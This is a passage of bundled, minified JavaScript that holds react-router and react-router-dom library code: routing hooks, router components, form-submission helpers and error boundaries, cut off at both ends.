  return useDataRouterState(DataRouterStateHook.UseNavigation).navigation;
}
function useRevalidator() {
  let dataRouterContext = useDataRouterContext(DataRouterHook.UseRevalidator), state = useDataRouterState(DataRouterStateHook.UseRevalidator);
  return {
    revalidate: dataRouterContext.router.revalidate,
    state: state.revalidation
  };
}
function useMatches() {
  let {
    matches,
    loaderData
  } = useDataRouterState(DataRouterStateHook.UseMatches);
  return React.useMemo(() => matches.map((match) => {
    let {
      pathname,
      params
    } = match;
    return {
      id: match.route.id,
      pathname,
      params,
      data: loaderData[match.route.id],
      handle: match.route.handle
    };
  }), [matches, loaderData]);
}
function useLoaderData() {
  let state = useDataRouterState(DataRouterStateHook.UseLoaderData), routeId = useCurrentRouteId(DataRouterStateHook.UseLoaderData);
  if (state.errors && state.errors[routeId] != null) {
    console.error("You cannot `useLoaderData` in an errorElement (routeId: " + routeId + ")");
    return;
  }
  return state.loaderData[routeId];
}
function useRouteLoaderData(routeId) {
  return useDataRouterState(DataRouterStateHook.UseRouteLoaderData).loaderData[routeId];
}
function useActionData() {
  let state = useDataRouterState(DataRouterStateHook.UseActionData);
  return React.useContext(RouteContext) || invariant(!1), Object.values((state == null ? void 0 : state.actionData) || {})[0];
}
function useRouteError() {
  var _state$errors;
  let error = React.useContext(RouteErrorContext), state = useDataRouterState(DataRouterStateHook.UseRouteError), routeId = useCurrentRouteId(DataRouterStateHook.UseRouteError);
  return error || ((_state$errors = state.errors) == null ? void 0 : _state$errors[routeId]);
}
function useAsyncValue() {
  let value = React.useContext(AwaitContext);
  return value == null ? void 0 : value._data;
}
function useAsyncError() {
  let value = React.useContext(AwaitContext);
  return value == null ? void 0 : value._error;
}
function useBlocker(shouldBlock) {
  let {
    router,
    basename
  } = useDataRouterContext(DataRouterHook.UseBlocker), state = useDataRouterState(DataRouterStateHook.UseBlocker), [blockerKey, setBlockerKey] = React.useState(""), blockerFunction = React.useCallback((arg) => {
    if (typeof shouldBlock != "function")
      return !!shouldBlock;
    if (basename === "/")
      return shouldBlock(arg);
    let {
      currentLocation,
      nextLocation,
      historyAction
    } = arg;
    return shouldBlock({
      currentLocation: _extends2({}, currentLocation, {
        pathname: stripBasename(currentLocation.pathname, basename) || currentLocation.pathname
      }),
      nextLocation: _extends2({}, nextLocation, {
        pathname: stripBasename(nextLocation.pathname, basename) || nextLocation.pathname
      }),
      historyAction
    });
  }, [basename, shouldBlock]);
  return React.useEffect(() => {
    let key = String(++blockerId);
    return setBlockerKey(key), () => router.deleteBlocker(key);
  }, [router]), React.useEffect(() => {
    blockerKey !== "" && router.getBlocker(blockerKey, blockerFunction);
  }, [router, blockerKey, blockerFunction]), blockerKey && state.blockers.has(blockerKey) ? state.blockers.get(blockerKey) : IDLE_BLOCKER;
}
function useNavigateStable() {
  let {
    router
  } = useDataRouterContext(DataRouterHook.UseNavigateStable), id = useCurrentRouteId(DataRouterStateHook.UseNavigateStable), activeRef = React.useRef(!1);
  return useIsomorphicLayoutEffect(() => {
    activeRef.current = !0;
  }), React.useCallback(function(to, options) {
    options === void 0 && (options = {}), activeRef.current && (typeof to == "number" ? router.navigate(to) : router.navigate(to, _extends2({
      fromRouteId: id
    }, options)));
  }, [router, id]);
}
function RouterProvider(_ref) {
  let {
    fallbackElement,
    router,
    future: future2
  } = _ref, [state, setStateImpl] = React.useState(router.state), {
    v7_startTransition
  } = future2 || {}, setState = React.useCallback((newState) => {
    v7_startTransition && startTransitionImpl ? startTransitionImpl(() => setStateImpl(newState)) : setStateImpl(newState);
  }, [setStateImpl, v7_startTransition]);
  React.useLayoutEffect(() => router.subscribe(setState), [router, setState]);
  let navigator = React.useMemo(() => ({
    createHref: router.createHref,
    encodeLocation: router.encodeLocation,
    go: (n) => router.navigate(n),
    push: (to, state2, opts) => router.navigate(to, {
      state: state2,
      preventScrollReset: opts == null ? void 0 : opts.preventScrollReset
    }),
    replace: (to, state2, opts) => router.navigate(to, {
      replace: !0,
      state: state2,
      preventScrollReset: opts == null ? void 0 : opts.preventScrollReset
    })
  }), [router]), basename = router.basename || "/", dataRouterContext = React.useMemo(() => ({
    router,
    navigator,
    static: !1,
    basename
  }), [router, navigator, basename]);
  return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(DataRouterContext.Provider, {
    value: dataRouterContext
  }, /* @__PURE__ */ React.createElement(DataRouterStateContext.Provider, {
    value: state
  }, /* @__PURE__ */ React.createElement(Router, {
    basename,
    location: state.location,
    navigationType: state.historyAction,
    navigator
  }, state.initialized ? /* @__PURE__ */ React.createElement(DataRoutes, {
    routes: router.routes,
    state
  }) : fallbackElement))), null);
}
function DataRoutes(_ref2) {
  let {
    routes: routes2,
    state
  } = _ref2;
  return useRoutesImpl(routes2, void 0, state);
}
function MemoryRouter(_ref3) {
  let {
    basename,
    children,
    initialEntries,
    initialIndex,
    future: future2
  } = _ref3, historyRef = React.useRef();
  historyRef.current == null && (historyRef.current = createMemoryHistory({
    initialEntries,
    initialIndex,
    v5Compat: !0
  }));
  let history = historyRef.current, [state, setStateImpl] = React.useState({
    action: history.action,
    location: history.location
  }), {
    v7_startTransition
  } = future2 || {}, setState = React.useCallback((newState) => {
    v7_startTransition && startTransitionImpl ? startTransitionImpl(() => setStateImpl(newState)) : setStateImpl(newState);
  }, [setStateImpl, v7_startTransition]);
  return React.useLayoutEffect(() => history.listen(setState), [history, setState]), /* @__PURE__ */ React.createElement(Router, {
    basename,
    children,
    location: state.location,
    navigationType: state.action,
    navigator: history
  });
}
function Navigate(_ref4) {
  let {
    to,
    replace,
    state,
    relative
  } = _ref4;
  useInRouterContext() || invariant(!1);
  let {
    matches
  } = React.useContext(RouteContext), {
    pathname: locationPathname
  } = useLocation(), navigate = useNavigate(), path2 = resolveTo(to, getPathContributingMatches(matches).map((match) => match.pathnameBase), locationPathname, relative === "path"), jsonPath = JSON.stringify(path2);
  return React.useEffect(() => navigate(JSON.parse(jsonPath), {
    replace,
    state,
    relative
  }), [navigate, jsonPath, relative, replace, state]), null;
}
function Outlet(props) {
  return useOutlet(props.context);
}
function Route(_props) {
  invariant(!1);
}
function Router(_ref5) {
  let {
    basename: basenameProp = "/",
    children = null,
    location: locationProp,
    navigationType = Action.Pop,
    navigator,
    static: staticProp = !1
  } = _ref5;
  useInRouterContext() && invariant(!1);
  let basename = basenameProp.replace(/^\/*/, "/"), navigationContext = React.useMemo(() => ({
    basename,
    navigator,
    static: staticProp
  }), [basename, navigator, staticProp]);
  typeof locationProp == "string" && (locationProp = parsePath(locationProp));
  let {
    pathname = "/",
    search = "",
    hash = "",
    state = null,
    key = "default"
  } = locationProp, locationContext = React.useMemo(() => {
    let trailingPathname = stripBasename(pathname, basename);
    return trailingPathname == null ? null : {
      location: {
        pathname: trailingPathname,
        search,
        hash,
        state,
        key
      },
      navigationType
    };
  }, [basename, pathname, search, hash, state, key, navigationType]);
  return locationContext == null ? null : /* @__PURE__ */ React.createElement(NavigationContext.Provider, {
    value: navigationContext
  }, /* @__PURE__ */ React.createElement(LocationContext.Provider, {
    children,
    value: locationContext
  }));
}
function Routes(_ref6) {
  let {
    children,
    location
  } = _ref6;
  return useRoutes(createRoutesFromChildren(children), location);
}
function Await(_ref7) {
  let {
    children,
    errorElement,
    resolve
  } = _ref7;
  return /* @__PURE__ */ React.createElement(AwaitErrorBoundary, {
    resolve,
    errorElement
  }, /* @__PURE__ */ React.createElement(ResolveAwait, null, children));
}
function ResolveAwait(_ref8) {
  let {
    children
  } = _ref8, data = useAsyncValue(), toRender = typeof children == "function" ? children(data) : children;
  return /* @__PURE__ */ React.createElement(React.Fragment, null, toRender);
}
function createRoutesFromChildren(children, parentPath) {
  parentPath === void 0 && (parentPath = []);
  let routes2 = [];
  return React.Children.forEach(children, (element, index) => {
    if (!/* @__PURE__ */ React.isValidElement(element))
      return;
    let treePath = [...parentPath, index];
    if (element.type === React.Fragment) {
      routes2.push.apply(routes2, createRoutesFromChildren(element.props.children, treePath));
      return;
    }
    element.type !== Route && invariant(!1), !element.props.index || !element.props.children || invariant(!1);
    let route = {
      id: element.props.id || treePath.join("-"),
      caseSensitive: element.props.caseSensitive,
      element: element.props.element,
      Component: element.props.Component,
      index: element.props.index,
      path: element.props.path,
      loader: element.props.loader,
      action: element.props.action,
      errorElement: element.props.errorElement,
      ErrorBoundary: element.props.ErrorBoundary,
      hasErrorBoundary: element.props.ErrorBoundary != null || element.props.errorElement != null,
      shouldRevalidate: element.props.shouldRevalidate,
      handle: element.props.handle,
      lazy: element.props.lazy
    };
    element.props.children && (route.children = createRoutesFromChildren(element.props.children, treePath)), routes2.push(route);
  }), routes2;
}
function renderMatches(matches) {
  return _renderMatches(matches);
}
function mapRouteProperties(route) {
  let updates = {
    // Note: this check also occurs in createRoutesFromChildren so update
    // there if you change this -- please and thank you!
    hasErrorBoundary: route.ErrorBoundary != null || route.errorElement != null
  };
  return route.Component && Object.assign(updates, {
    element: /* @__PURE__ */ React.createElement(route.Component),
    Component: void 0
  }), route.ErrorBoundary && Object.assign(updates, {
    errorElement: /* @__PURE__ */ React.createElement(route.ErrorBoundary),
    ErrorBoundary: void 0
  }), updates;
}
function createMemoryRouter(routes2, opts) {
  return createRouter({
    basename: opts == null ? void 0 : opts.basename,
    future: _extends2({}, opts == null ? void 0 : opts.future, {
      v7_prependBasename: !0
    }),
    history: createMemoryHistory({
      initialEntries: opts == null ? void 0 : opts.initialEntries,
      initialIndex: opts == null ? void 0 : opts.initialIndex
    }),
    hydrationData: opts == null ? void 0 : opts.hydrationData,
    routes: routes2,
    mapRouteProperties
  }).initialize();
}
var React, DataRouterContext, DataRouterStateContext, AwaitContext, NavigationContext, LocationContext, RouteContext, RouteErrorContext, OutletContext, defaultErrorElement, RenderErrorBoundary, DataRouterHook, DataRouterStateHook, blockerId, START_TRANSITION, startTransitionImpl, AwaitRenderStatus, neverSettledPromise, AwaitErrorBoundary, init_dist = __esm({
  "node_modules/react-router/dist/index.js"() {
    React = __toESM(require_react());
    init_router();
    init_router();
    DataRouterContext = /* @__PURE__ */ React.createContext(null), DataRouterStateContext = /* @__PURE__ */ React.createContext(null), AwaitContext = /* @__PURE__ */ React.createContext(null), NavigationContext = /* @__PURE__ */ React.createContext(null), LocationContext = /* @__PURE__ */ React.createContext(null), RouteContext = /* @__PURE__ */ React.createContext({
      outlet: null,
      matches: [],
      isDataRoute: !1
    }), RouteErrorContext = /* @__PURE__ */ React.createContext(null);
    OutletContext = /* @__PURE__ */ React.createContext(null);
    defaultErrorElement = /* @__PURE__ */ React.createElement(DefaultErrorComponent, null), RenderErrorBoundary = class extends React.Component {
      constructor(props) {
        super(props), this.state = {
          location: props.location,
          revalidation: props.revalidation,
          error: props.error
        };
      }
      static getDerivedStateFromError(error) {
        return {
          error
        };
      }
      static getDerivedStateFromProps(props, state) {
        return state.location !== props.location || state.revalidation !== "idle" && props.revalidation === "idle" ? {
          error: props.error,
          location: props.location,
          revalidation: props.revalidation
        } : {
          error: props.error || state.error,
          location: state.location,
          revalidation: props.revalidation || state.revalidation
        };
      }
      componentDidCatch(error, errorInfo) {
        console.error("React Router caught the following error during render", error, errorInfo);
      }
      render() {
        return this.state.error ? /* @__PURE__ */ React.createElement(RouteContext.Provider, {
          value: this.props.routeContext
        }, /* @__PURE__ */ React.createElement(RouteErrorContext.Provider, {
          value: this.state.error,
          children: this.props.component
        })) : this.props.children;
      }
    };
    (function(DataRouterHook3) {
      DataRouterHook3.UseBlocker = "useBlocker", DataRouterHook3.UseRevalidator = "useRevalidator", DataRouterHook3.UseNavigateStable = "useNavigate";
    })(DataRouterHook || (DataRouterHook = {}));
    (function(DataRouterStateHook3) {
      DataRouterStateHook3.UseBlocker = "useBlocker", DataRouterStateHook3.UseLoaderData = "useLoaderData", DataRouterStateHook3.UseActionData = "useActionData", DataRouterStateHook3.UseRouteError = "useRouteError", DataRouterStateHook3.UseNavigation = "useNavigation", DataRouterStateHook3.UseRouteLoaderData = "useRouteLoaderData", DataRouterStateHook3.UseMatches = "useMatches", DataRouterStateHook3.UseRevalidator = "useRevalidator", DataRouterStateHook3.UseNavigateStable = "useNavigate", DataRouterStateHook3.UseRouteId = "useRouteId";
    })(DataRouterStateHook || (DataRouterStateHook = {}));
    blockerId = 0;
    START_TRANSITION = "startTransition", startTransitionImpl = React[START_TRANSITION];
    (function(AwaitRenderStatus2) {
      AwaitRenderStatus2[AwaitRenderStatus2.pending = 0] = "pending", AwaitRenderStatus2[AwaitRenderStatus2.success = 1] = "success", AwaitRenderStatus2[AwaitRenderStatus2.error = 2] = "error";
    })(AwaitRenderStatus || (AwaitRenderStatus = {}));
    neverSettledPromise = new Promise(() => {
    }), AwaitErrorBoundary = class extends React.Component {
      constructor(props) {
        super(props), this.state = {
          error: null
        };
      }
      static getDerivedStateFromError(error) {
        return {
          error
        };
      }
      componentDidCatch(error, errorInfo) {
        console.error("<Await> caught the following error during render", error, errorInfo);
      }
      render() {
        let {
          children,
          errorElement,
          resolve
        } = this.props, promise = null, status = AwaitRenderStatus.pending;
        if (!(resolve instanceof Promise))
          status = AwaitRenderStatus.success, promise = Promise.resolve(), Object.defineProperty(promise, "_tracked", {
            get: () => !0
          }), Object.defineProperty(promise, "_data", {
            get: () => resolve
          });
        else if (this.state.error) {
          status = AwaitRenderStatus.error;
          let renderError = this.state.error;
          promise = Promise.reject().catch(() => {
          }), Object.defineProperty(promise, "_tracked", {
            get: () => !0
          }), Object.defineProperty(promise, "_error", {
            get: () => renderError
          });
        } else
          resolve._tracked ? (promise = resolve, status = promise._error !== void 0 ? AwaitRenderStatus.error : promise._data !== void 0 ? AwaitRenderStatus.success : AwaitRenderStatus.pending) : (status = AwaitRenderStatus.pending, Object.defineProperty(resolve, "_tracked", {
            get: () => !0
          }), promise = resolve.then((data) => Object.defineProperty(resolve, "_data", {
            get: () => data
          }), (error) => Object.defineProperty(resolve, "_error", {
            get: () => error
          })));
        if (status === AwaitRenderStatus.error && promise._error instanceof AbortedDeferredError)
          throw neverSettledPromise;
        if (status === AwaitRenderStatus.error && !errorElement)
          throw promise._error;
        if (status === AwaitRenderStatus.error)
          return /* @__PURE__ */ React.createElement(AwaitContext.Provider, {
            value: promise,
            children: errorElement
          });
        if (status === AwaitRenderStatus.success)
          return /* @__PURE__ */ React.createElement(AwaitContext.Provider, {
            value: promise,
            children
          });
        throw promise;
      }
    };
  }
});

// node_modules/react-router-dom/dist/index.js
var dist_exports2 = {};
__export(dist_exports2, {
  AbortedDeferredError: () => AbortedDeferredError,
  Await: () => Await,
  BrowserRouter: () => BrowserRouter,
  Form: () => Form,
  HashRouter: () => HashRouter,
  Link: () => Link,
  MemoryRouter: () => MemoryRouter,
  NavLink: () => NavLink,
  Navigate: () => Navigate,
  NavigationType: () => Action,
  Outlet: () => Outlet,
  Route: () => Route,
  Router: () => Router,
  RouterProvider: () => RouterProvider,
  Routes: () => Routes,
  ScrollRestoration: () => ScrollRestoration,
  UNSAFE_DataRouterContext: () => DataRouterContext,
  UNSAFE_DataRouterStateContext: () => DataRouterStateContext,
  UNSAFE_LocationContext: () => LocationContext,
  UNSAFE_NavigationContext: () => NavigationContext,
  UNSAFE_RouteContext: () => RouteContext,
  UNSAFE_useRouteId: () => useRouteId,
  UNSAFE_useScrollRestoration: () => useScrollRestoration,
  createBrowserRouter: () => createBrowserRouter,
  createHashRouter: () => createHashRouter,
  createMemoryRouter: () => createMemoryRouter,
  createPath: () => createPath,
  createRoutesFromChildren: () => createRoutesFromChildren,
  createRoutesFromElements: () => createRoutesFromChildren,
  createSearchParams: () => createSearchParams,
  defer: () => defer,
  generatePath: () => generatePath,
  isRouteErrorResponse: () => isRouteErrorResponse,
  json: () => json,
  matchPath: () => matchPath,
  matchRoutes: () => matchRoutes,
  parsePath: () => parsePath,
  redirect: () => redirect,
  renderMatches: () => renderMatches,
  resolvePath: () => resolvePath,
  unstable_HistoryRouter: () => HistoryRouter,
  unstable_useBlocker: () => useBlocker,
  unstable_usePrompt: () => usePrompt,
  useActionData: () => useActionData,
  useAsyncError: () => useAsyncError,
  useAsyncValue: () => useAsyncValue,
  useBeforeUnload: () => useBeforeUnload,
  useFetcher: () => useFetcher,
  useFetchers: () => useFetchers,
  useFormAction: () => useFormAction,
  useHref: () => useHref,
  useInRouterContext: () => useInRouterContext,
  useLinkClickHandler: () => useLinkClickHandler,
  useLoaderData: () => useLoaderData,
  useLocation: () => useLocation,
  useMatch: () => useMatch,
  useMatches: () => useMatches,
  useNavigate: () => useNavigate,
  useNavigation: () => useNavigation,
  useNavigationType: () => useNavigationType,
  useOutlet: () => useOutlet,
  useOutletContext: () => useOutletContext,
  useParams: () => useParams,
  useResolvedPath: () => useResolvedPath,
  useRevalidator: () => useRevalidator,
  useRouteError: () => useRouteError,
  useRouteLoaderData: () => useRouteLoaderData,
  useRoutes: () => useRoutes,
  useSearchParams: () => useSearchParams,
  useSubmit: () => useSubmit
});
function _extends3() {
  return _extends3 = Object.assign ? Object.assign.bind() : function(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i];
      for (var key in source)
        Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
    }
    return target;
  }, _extends3.apply(this, arguments);
}
function _objectWithoutPropertiesLoose(source, excluded) {
  if (source == null)
    return {};
  var target = {}, sourceKeys = Object.keys(source), key, i;
  for (i = 0; i < sourceKeys.length; i++)
    key = sourceKeys[i], !(excluded.indexOf(key) >= 0) && (target[key] = source[key]);
  return target;
}
function isHtmlElement(object) {
  return object != null && typeof object.tagName == "string";
}
function isButtonElement(object) {
  return isHtmlElement(object) && object.tagName.toLowerCase() === "button";
}
function isFormElement(object) {
  return isHtmlElement(object) && object.tagName.toLowerCase() === "form";
}
function isInputElement(object) {
  return isHtmlElement(object) && object.tagName.toLowerCase() === "input";
}
function isModifiedEvent(event2) {
  return !!(event2.metaKey || event2.altKey || event2.ctrlKey || event2.shiftKey);
}
function shouldProcessLinkClick(event2, target) {
  return event2.button === 0 && // Ignore everything but left clicks
  (!target || target === "_self") && // Let browser handle "target=_blank" etc.
  !isModifiedEvent(event2);
}
function createSearchParams(init) {
  return init === void 0 && (init = ""), new URLSearchParams(typeof init == "string" || Array.isArray(init) || init instanceof URLSearchParams ? init : Object.keys(init).reduce((memo, key) => {
    let value = init[key];
    return memo.concat(Array.isArray(value) ? value.map((v) => [key, v]) : [[key, value]]);
  }, []));
}
function getSearchParamsForLocation(locationSearch, defaultSearchParams) {
  let searchParams = createSearchParams(locationSearch);
  if (defaultSearchParams)
    for (let key of defaultSearchParams.keys())
      searchParams.has(key) || defaultSearchParams.getAll(key).forEach((value) => {
        searchParams.append(key, value);
      });
  return searchParams;
}
function isFormDataSubmitterSupported() {
  if (_formDataSupportsSubmitter === null)
    try {
      new FormData(
        document.createElement("form"),
        // @ts-expect-error if FormData supports the submitter parameter, this will throw
        0
      ), _formDataSupportsSubmitter = !1;
    } catch {
      _formDataSupportsSubmitter = !0;
    }
  return _formDataSupportsSubmitter;
}
function getFormEncType(encType) {
  return encType != null && !supportedFormEncTypes.has(encType) ? null : encType;
}
function getFormSubmissionInfo(target, basename) {
  let method, action2, encType, formData, body;
  if (isFormElement(target)) {
    let attr = target.getAttribute("action");
    action2 = attr ? stripBasename(attr, basename) : null, method = target.getAttribute("method") || defaultMethod, encType = getFormEncType(target.getAttribute("enctype")) || defaultEncType, formData = new FormData(target);
  } else if (isButtonElement(target) || isInputElement(target) && (target.type === "submit" || target.type === "image")) {
    let form = target.form;
    if (form == null)
      throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');
    let attr = target.getAttribute("formaction") || form.getAttribute("action");
    if (action2 = attr ? stripBasename(attr, basename) : null, method = target.getAttribute("formmethod") || form.getAttribute("method") || defaultMethod, encType = getFormEncType(target.getAttribute("formenctype")) || getFormEncType(form.getAttribute("enctype")) || defaultEncType, formData = new FormData(form, target), !isFormDataSubmitterSupported()) {
      let {
        name,
        type,
        value
      } = target;
      if (type === "image") {
        let prefix = name ? name + "." : "";
        formData.append(prefix + "x", "0"), formData.append(prefix + "y", "0");
      } else
        name && formData.append(name, value);
    }
  } else {
    if (isHtmlElement(target))
      throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');
    method = defaultMethod, action2 = null, encType = defaultEncType, body = target;
  }
  return formData && encType === "text/plain" && (body = formData, formData = void 0), {
    action: action2,
    method: method.toLowerCase(),
    encType,
    formData,
    body
  };
}
function createBrowserRouter(routes2, opts) {
  return createRouter({
    basename: opts == null ? void 0 : opts.basename,
    future: _extends3({}, opts == null ? void 0 : opts.future, {
      v7_prependBasename: !0
    }),
    history: createBrowserHistory({
      window: opts == null ? void 0 : opts.window
    }),
    hydrationData: (opts == null ? void 0 : opts.hydrationData) || parseHydrationData(),
    routes: routes2,
    mapRouteProperties
  }).initialize();
}
function createHashRouter(routes2, opts) {
  return createRouter({
    basename: opts == null ? void 0 : opts.basename,
    future: _extends3({}, opts == null ? void 0 : opts.future, {
      v7_prependBasename: !0
    }),
    history: createHashHistory({
      window: opts == null ? void 0 : opts.window
    }),
    hydrationData: (opts == null ? void 0 : opts.hydrationData) || parseHydrationData(),
    routes: routes2,
    mapRouteProperties
  }).initialize();
}
function parseHydrationData() {
  var _window;
  let state = (_window = window) == null ? void 0 : _window.__staticRouterHydrationData;
  return state && state.errors && (state = _extends3({}, state, {
    errors: deserializeErrors(state.errors)
  })), state;
}
function deserializeErrors(errors) {
  if (!errors)
    return null;
  let entries = Object.entries(errors), serialized = {};
  for (let [key, val] of entries)
    if (val && val.__type === "RouteErrorResponse")
      serialized[key] = new ErrorResponse(val.status, val.statusText, val.data, val.internal === !0);
    else if (val && val.__type === "Error") {
      if (val.__subType) {
        let ErrorConstructor = window[val.__subType];
        if (typeof ErrorConstructor == "function")
          try {
            let error = new ErrorConstructor(val.message);
            error.stack = "", serialized[key] = error;
          } catch {
          }
      }
      if (serialized[key] == null) {
        let error = new Error(val.message);
        error.stack = "", serialized[key] = error;
      }
    } else
      serialized[key] = val;
  return serialized;
}
function BrowserRouter(_ref) {
  let {
    basename,
    children,
    future: future2,
    window: window2
  } = _ref, historyRef = React2.useRef();
  historyRef.current == null && (historyRef.current = createBrowserHistory({
    window: window2,
    v5Compat: !0
  }));
  let history = historyRef.current, [state, setStateImpl] = React2.useState({
    action: history.action,
    location: history.location
  }), {
    v7_startTransition
  } = future2 || {}, setState = React2.useCallback((newState) => {
    v7_startTransition && startTransitionImpl2 ? startTransitionImpl2(() => setStateImpl(newState)) : setStateImpl(newState);
  }, [setStateImpl, v7_startTransition]);
  return React2.useLayoutEffect(() => history.listen(setState), [history, setState]), /* @__PURE__ */ React2.createElement(Router, {
    basename,
    children,
    location: state.location,
    navigationType: state.action,
    navigator: history
  });
}
function HashRouter(_ref2) {
  let {
    basename,
    children,
    future: future2,
    window: window2
  } = _ref2, historyRef = React2.useRef();
  historyRef.current == null && (historyRef.current = createHashHistory({
    window: window2,
    v5Compat: !0
  }));
  let history = historyRef.current, [state, setStateImpl] = React2.useState({
    action: history.action,
    location: history.location
  }), {
    v7_startTransition
  } = future2 || {}, setState = React2.useCallback((newState) => {
    v7_startTransition && startTransitionImpl2 ? startTransitionImpl2(() => setStateImpl(newState)) : setStateImpl(newState);
  }, [setStateImpl, v7_startTransition]);
  return React2.useLayoutEffect(() => history.listen(setState), [history, setState]), /* @__PURE__ */ React2.createElement(Router, {
    basename,
    children,
    location: state.location,
    navigationType: state.action,
    navigator: history
  });
}
function HistoryRouter(_ref3) {
  let {
    basename,
    children,
    future: future2,
    history
  } = _ref3, [state, setStateImpl] = React2.useState({
    action: history.action,
    location: history.location
  }), {
    v7_startTransition
  } = future2 || {}, setState = React2.useCallback((newState) => {
    v7_startTransition && startTransitionImpl2 ? startTransitionImpl2(() => setStateImpl(newState)) : setStateImpl(newState);
  }, [setStateImpl, v7_startTransition]);
  return React2.useLayoutEffect(() => history.listen(setState), [history, setState]), /* @__PURE__ */ React2.createElement(Router, {
    basename,
    children,
    location: state.location,
    navigationType: state.action,
    navigator: history
  });
}
function ScrollRestoration(_ref7) {
  let {
    getKey,
    storageKey
  } = _ref7;
  return useScrollRestoration({
    getKey,
    storageKey
  }), null;
}
function useDataRouterContext2(hookName) {
  let ctx = React2.useContext(DataRouterContext);
  return ctx || invariant(!1), ctx;
}
function useDataRouterState2(hookName) {
  let state = React2.useContext(DataRouterStateContext);
  return state || invariant(!1), state;
}
function useLinkClickHandler(to, _temp) {
  let {
    target,
    replace: replaceProp,
    state,
    preventScrollReset,
    relative
  } = _temp === void 0 ? {} : _temp, navigate = useNavigate(), location = useLocation(), path2 = useResolvedPath(to, {
    relative
  });
  return React2.useCallback((event2) => {
    if (shouldProcessLinkClick(event2, target)) {
      event2.preventDefault();
      let replace = replaceProp !== void 0 ? replaceProp : createPath(location) === createPath(path2);
      navigate(to, {
        replace,
        state,
        preventScrollReset,
        relative
      });
    }
  }, [location, navigate, path2, replaceProp, state, target, to, preventScrollReset, relative]);
}
function useSearchParams(defaultInit) {
  let defaultSearchParamsRef = React2.useRef(createSearchParams(defaultInit)), hasSetSearchParamsRef = React2.useRef(!1), location = useLocation(), searchParams = React2.useMemo(() => (
    // Only merge in the defaults if we haven't yet called setSearchParams.
    // Once we call that we want those to take precedence, otherwise you can't
    // remove a param with setSearchParams({}) if it has an initial value
    getSearchParamsForLocation(location.search, hasSetSearchParamsRef.current ? null : defaultSearchParamsRef.current)
  ), [location.search]), navigate = useNavigate(), setSearchParams = React2.useCallback((nextInit, navigateOptions) => {
    let newSearchParams = createSearchParams(typeof nextInit == "function" ? nextInit(searchParams) : nextInit);
    hasSetSearchParamsRef.current = !0, navigate("?" + newSearchParams, navigateOptions);
  }, [navigate, searchParams]);
  return [searchParams, setSearchParams];
}
function validateClientSideSubmission() {
  if (typeof document > "u")
    throw new Error("You are calling submit during the server render. Try calling submit within a `useEffect` or callback instead.");
}
function useSubmit() {
  let {
    router
  } = useDataRouterContext2(DataRouterHook2.UseSubmit), {
    basename
  } = React2.useContext(NavigationContext), currentRouteId = useRouteId();
  return React2.useCallback(function(target, options) {
    options === void 0 && (options = {}), validateClientSideSubmission();
    let {
      action: action2,
      method,
      encType,
      formData,
      body
    } = getFormSubmissionInfo(target, basename);
    router.navigate(options.action || action2, {
      preventScrollReset: options.preventScrollReset,
      formData,
      body,
      formMethod: options.method || method,
      formEncType: options.encType || encType,
      replace: options.replace,
      state: options.state,
      fromRouteId: currentRouteId
    });
  }, [router, basename, currentRouteId]);
}
function useSubmitFetcher(fetcherKey, fetcherRouteId) {
  let {
    router
  } = useDataRouterContext2(DataRouterHook2.UseSubmitFetcher), {
    basename
  } = React2.useContext(NavigationContext);
  return React2.useCallback(function(target, options) {
    options === void 0 && (options = {}), validateClientSideSubmission();
    let {
      action: action2,
      method,
      encType,
      formData,
      body
    } = getFormSubmissionInfo(target, basename);
    fetcherRouteId == null && invariant(!1), router.fetch(fetcherKey, fetcherRouteId, options.action || action2, {
      preventScrollReset: options.preventScrollReset,
      formData,
      body,
      formMethod: options.method || method,
      formEncType: options.encType || encType
    });
  }, [router, basename, fetcherKey, fetcherRouteId]);
}
function useFormAction(action2, _temp2) {
  let {
    relative
  } = _temp2 === void 0 ? {} : _temp2, {
    basename
  } = React2.useContext(NavigationContext), routeContext = React2.useContext(RouteContext);
  routeContext || invariant(!1);
  let [match] = routeContext.matches.slice(-1), path2 = _extends3({}, useResolvedPath(action2 || ".", {
    relative
  })), location = useLocation();
  if (action2 == null && (path2.search = location.search, path2.hash = location.hash, match.route.index)) {
    let params = new URLSearchParams(path2.search);
    params.delete("index"), path2.search = params.toString() ? "?" + params.toString() : "";
  }
  return (!action2 || action2 === ".") && match.route.index && (path2.search = path2.search ? path2.search.replace(/^\?/, "?index&") : "?index"), basename !== "/" && (path2.pathname = path2.pathname === "/" ? basename : joinPaths([basename, path2.pathname])), createPath(path2);
}
function createFetcherForm(fetcherKey, routeId) {
  return /* @__PURE__ */ React2.forwardRef((props, ref) => {
    let submit = useSubmitFetcher(fetcherKey, routeId);
    return /* @__PURE__ */ React2.createElement(FormImpl, _extends3({}, props, {
      ref,
      submit
    }));
  });
}
function useFetcher() {
  var _route$matches;
  let {
    router
  } = useDataRouterContext2(DataRouterHook2.UseFetcher), route = React2.useContext(RouteContext);
  route || invariant(!1);
  let routeId = (_route$matches = route.matches[route.matches.length - 1]) == null ? void 0 : _route$matches.route.id;
  routeId == null && invariant(!1);
  let [fetcherKey] = React2.useState(() => String(++fetcherId)), [Form2] = React2.useState(() => (routeId || invariant(!1), createFetcherForm(fetcherKey, routeId))), [load] = React2.useState(() => (href) => {
    router || invariant(!1), routeId || invariant(!1), router.fetch(fetcherKey, routeId, href);
  }), submit = useSubmitFetcher(fetcherKey, routeId), fetcher = router.getFetcher(fetcherKey), fetcherWithComponents = React2.useMemo(() => _extends3({
    Form: Form2,
    submit,
    load
  }, fetcher), [fetcher, Form2, submit, load]);
  return React2.useEffect(() => () => {
    if (!router) {
      console.warn("No router available to clean up from useFetcher()");
      return;
    }
    router.deleteFetcher(fetcherKey);
  }, [router, fetcherKey]), fetcherWithComponents;
}
function useFetchers() {
  return [...useDataRouterState2(DataRouterStateHook2.UseFetchers).fetchers.values()];
}
function useScrollRestoration(_temp3) {
  let {
    getKey,
    storageKey
  } = _temp3 === void 0 ? {} : _temp3, {
    router
  } = useDataRouterContext2(DataRouterHook2.UseScrollRestoration), {
    restoreScrollPosition,
    preventScrollReset
  } = useDataRouterState2(DataRouterStateHook2.UseScrollRestoration), {
    basename
  } = React2.useContext(NavigationContext), location = useLocation(), matches = useMatches(), navigation = useNavigation();
  React2.useEffect(() => (window.history.scrollRestoration = "manual", () => {
